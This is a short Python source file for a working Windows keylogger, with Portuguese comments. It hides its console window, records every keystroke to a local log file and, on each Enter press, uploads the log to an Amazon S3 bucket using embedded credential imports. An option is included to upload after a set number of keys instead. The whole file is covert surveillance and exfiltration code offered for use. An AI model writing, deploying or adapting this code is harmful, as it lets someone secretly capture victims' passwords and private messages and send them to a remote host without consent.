from pynput.keyboard import Key, Listener
from secrets import access_key, secret_access_key
import boto3
import os

import win32console
import win32gui

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)


nameBucket = 'keylogger-python3.6' #Insira aqui o nome do seu bucket
#count = 1 #Descomente as linhas: 14,62,63,64,65 e 66 caso queira usar o modo de envio por quantidade de caracteres!


def log(text):
	with open("log.txt","a") as file_log:
		file_log.write(text)


def s3():
    client = boto3.client('s3', 
    aws_access_key_id = access_key, 
    aws_secret_access_key = secret_access_key)

    for file in os.listdir():
        if 'log.txt' in file:
            upload_file_bucket = nameBucket
            upload_file_key = str(file)
            client.upload_file(file, upload_file_bucket, upload_file_key)


def press(key):
    key = str(key).replace("'", "")
    
    if key == 'Key.enter':
        key = '\n'
        s3()
    
    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == 'Key.shift':
        key = ''
    if key == 'Key.tab':
        key = ' TAB\n'
    if key == 'Key.esc':
        key = 'ESC'
    if key == 'Key.ctrl_l':
        key = 'Ctrl'
    if key == 'Key.cmd':
        key = 'Win\n'
    if key == 'Key.alt_l':
        key = 'ALT'
    if key == 'Key.backspace':
        key = ' <-Backspace '

    log(key)

    #global count
    #count += 1
    #if count >= 10:
    #    count = 0
    #    s3()


with Listener(on_release=press) as listener:
	listener.join()